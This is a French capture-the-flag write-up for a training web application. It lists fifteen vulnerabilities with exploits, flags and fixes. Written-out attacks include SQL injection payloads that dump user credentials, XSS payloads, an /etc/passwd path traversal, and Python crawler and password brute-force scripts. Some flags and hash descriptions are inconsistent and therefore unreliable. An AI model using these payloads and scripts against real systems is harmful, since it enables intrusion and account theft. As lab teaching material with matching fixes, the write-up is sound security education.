# Exploits and Fixes

Ce document détaille les différents exploits trouvés et leurs solutions respectives.

## Table des matières
1. [Hidden Email Exploit](#1-hidden-email-exploit)
2. [XSS via Feedback Form](#2-xss-via-feedback-form)
3. [File Upload Bypass](#3-file-upload-bypass)
4. [HTTP Header Manipulation](#4-http-header-manipulation)
5. [SQL Injection](#5-sql-injection)
6. [Image Metadata Extraction](#6-image-metadata-extraction)
7. [Cookie Manipulation](#7-cookie-manipulation)
8. [Directory Traversal](#8-directory-traversal)
9. [Open Redirect](#9-open-redirect)
10. [Robots.txt Information Disclosure](#10-robotstxt-information-disclosure)
11. [Media Source XSS](#11-media-source-xss)
12. [Survey Form Manipulation](#12-survey-form-manipulation)
13. [Email Recovery Exploit](#13-email-recovery-exploit)
14. [Hidden Directory Crawling](#14-hidden-directory-crawling)
15. [Login Brute Force](#15-login-brute-force)

## 1. Hidden Email Exploit

### Exploit
En inspectant le code HTML de la page de récupération de mot de passe, on trouve un champ caché contenant l'email :

```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
    <input type="submit" name="Submit" value="Submit">
</form>
```

Le fait de modifier la valeur de ce champ permet de changer l'email de façon non autorisée.

**Flag**: `d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Supprimez les champs cachés pour les données sensibles
- Utilisez l'authentification basée sur la session
- Validez les requêtes de récupération d'email côté serveur

## 2. XSS via Feedback Form

### Exploit
Injection d'un script dans un champ d'entrée de formulaire qui déclenche une alerte :
```html
<svg onload=alert(1)>test
```

**Flag**: `0fbb54bbf7d099713ca4be297e1bc7da0173d8b3c21c1811b916a3a86652724e`

### Fix
- Échappez et assainissez les entrées utilisateur avec `htmlspecialchars()`
- Mettez en place une Content Security Policy (CSP)

## 3. File Upload Bypass

### Exploit
Modification de l'en-tête multipart/form-data dans une requête de téléversement de fichier :

```bash
curl -X POST -H "multipart/form-data" -F "uploaded=@./test.jpeg" -F "Upload=Upload" "http://172.19.71.187/?page=upload;type=image/jpeg" | grep flag
```

**Flag**: `46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

### Fix
- Restreignez les types de fichiers en validant les types MIME
- Stockez les fichiers uploadés hors de la racine web
- Scannez les fichiers pour détecter d'éventuels malwares

## 4. HTTP Header Manipulation

### Exploit
Manipulation des en-têtes HTTP Referer et User-Agent :

```bash
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" http://172.19.71.187/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Ne basez pas la sécurité uniquement sur des en-têtes HTTP
- Implémentez des mécanismes d'authentification robustes

## 5. SQL Injection

### Exploit
Utilisation d'injections SQL pour extraire des informations :

```sql
-- Version de la base de données
1 UNION ALL SELECT NULL,version()--

-- Extraction des noms de bases de données
1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--

-- Extraction des noms de tables
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema=0x4D656D6265725F53716C5F496E6A656374696F6E--

-- Extraction de données sensibles
1 UNION ALL SELECT NULL,concat(Commentaire,countersign) FROM users--
```

Crackage du mot de passe hashé :
```bash
echo -n fortytwo | shasum -a 256
```

**Flag**: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

### Fix
- Utilisez des requêtes préparées
- Assainissez les entrées utilisateur
- Envisagez l'utilisation d'un pare-feu applicatif (WAF)

## 6. Image Metadata Extraction

### Exploit
Injection SQL pour extraire des métadonnées d'images :

```sql
1 UNION ALL SELECT NULL,concat(url,title,comment) FROM Member_images.list_images--
```

Décodage du hash MD5 :
```bash
echo -n albatroz | shasum -a 256
```

**Flag**: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`

### Fix
- Restreignez les requêtes sur la base de données
- Cachez la structure des tables
- Appliquez des mesures de contrôle d'accès strictes

## 7. Cookie Manipulation

### Exploit
Identification et manipulation de cookies faiblement hachés :

Cookie original :
```
I_am_admin 68934a3e9455fa72420237eb05902327
```

Cookie modifié :
```
b326b5062b2f0e69046810717534cb09
```

**Flag**: `df2eb4ba34ed059a1e3e89ff4dfc13445f104a1a52295214def1c4fb1693a5c3`

### Fix
- Utilisez des attributs de cookie sécurisés
- Implémentez une gestion de session basée sur HMAC
- Appliquez des algorithmes de chiffrement robustes

## 8. Directory Traversal

### Exploit
Accès à un fichier système via une URL malformée :

```
http://172.19.71.187/?page=../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
```

**Flag**: `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

### Fix
- Mettez en place une validation et une normalisation des chemins
- Empêchez la traversée de répertoires

## 9. Open Redirect

### Exploit
Modification d'un lien de redirection :

```
http://172.19.71.187/index.php?page=redirect&site=test
```

**Flag**: `b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3`

### Fix
- Validez et limitez les redirections URL à des domaines sûrs
- Évitez les détournements

## 10. Robots.txt Information Disclosure

### Exploit
Le fichier robots.txt révèle des répertoires sensibles :

```
User-agent: *
Disallow: /whatever
Disallow: /.hidden
```

Contenu du fichier htpasswd :
```
root:437394baff5aa33daa618be47b75cb49
```

**Flag**: `d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff`

### Fix
- Ne divulguez pas de fichiers sensibles via robots.txt
- Sécurisez l'accès aux zones administratives par une authentification forte

## 11. Media Source XSS

### Exploit
Injection via le paramètre src d'une image :

```
http://172.28.162.203/index.php?page=media&src=nsa
```

Charge utile base64 :
```
data:text/html;base64,PHNjcmlwdD5hbGVydCg0Mik8L3NjcmlwdD4=
```

**Flag**: `928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d`

### Fix
- Assainissez les paramètres d'URL
- Validez correctement les entrées pour les sources médias

## 12. Survey Form Manipulation

### Exploit
Modification des données POST du formulaire de sondage :

```bash
curl 'http://x.x.x.x/index.php?page=survey#' --data 'sujet=2&valeur=42'
```

**Flag**: `03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa`

### Fix
- Implémentez une validation stricte côté serveur
- Limitez les valeurs acceptées

## 13. Email Recovery Exploit

### Exploit
Modification de l'email via une requête POST :

```bash
curl 'http://x.x.x.x/?page=recover#' --data 'mail=test%40test.test&Submit=Submit'
```

**Flag**: `1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0`

### Fix
- Supprimez les champs cachés pour les données sensibles
- Effectuez une validation côté serveur
- Utilisez une gestion de session sécurisée

## 14. Hidden Directory Crawling

### Exploit
Script Python pour explorer les dossiers cachés :

```python
import requests
import time
from urllib.parse import urljoin

session = requests.Session()

def crawl(url, visited=set(), depth=0, max_depth=15):
    if url in visited or depth > max_depth:
        return
    visited.add(url)

    try:
        r = session.get(url, timeout=5)
        if r.status_code != 200:
            return

        print(f"[+] {url}")

        lines = r.text.splitlines()
        for line in lines:
            if 'href="' in line:
                start = line.find('href="') + 6
                end = line.find('"', start)
                href = line[start:end]

                if href == '../':
                    continue

                full_url = urljoin(url, href)

                if href.endswith('/'):
                    time.sleep(0.1)
                    crawl(full_url, visited, depth + 1)
                else:
                    print(f"    └── {full_url}")
                    if 'README' in href.upper():
                        try:
                            file_response = session.get(full_url, timeout=5)
                            if file_response.status_code == 200:
                                print("        --- Contenu du README ---")
                                print(file_response.text)
                                print("        --------------------------")
                        except requests.exceptions.RequestException as e:
                            print(f"        [!] Erreur lors de la lecture du fichier : {e}")

    except requests.exceptions.RequestException as e:
        print(f"[!] Erreur sur {url} : {e}")

# Exemple d'URL à lancer
crawl("http://172.28.162.203/.hidden/")
```

### Fix
- Sécurisez les répertoires cachés
- Limitez l'accès
- Supprimez l'exposition inutile des structures internes

## 15. Login Brute Force

### Exploit
Script Python pour le brute force de la page de connexion :

```python
import requests

passwords = [
    "123456", "password", "12345678", "qwerty", "abc123", "123456789", "111111", "1234567",
    "iloveyou", "adobe123", "123123", "Admin", "1234567890", "letmein", "photoshop", "1234",
    "monkey", "shadow", "sunshine", "12345", "password1", "princess", "azerty", "trustno1", "000000"
]

url = "http://192.168.2.128/index.php"
params = {
    "page": "signin",
    "username": "admin",
    "Login": "Login#"
}

for pwd in passwords:
    params["password"] = pwd
    try:
        response = requests.post(url, params=params)
        if "flag" in response.text:
            print(f"[+] Mot de passe trouvé: {pwd}")
            print(response.text)
            break
    except requests.RequestException as e:
        print(f"Erreur avec le mot de passe '{pwd}': {e}")
```

**Flag**: `b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2`

### Fix
- Implémentez des politiques de mot de passe robustes
- Activez le verrouillage des comptes après plusieurs tentatives infructueuses
- Utilisez l'authentification multifactorielle
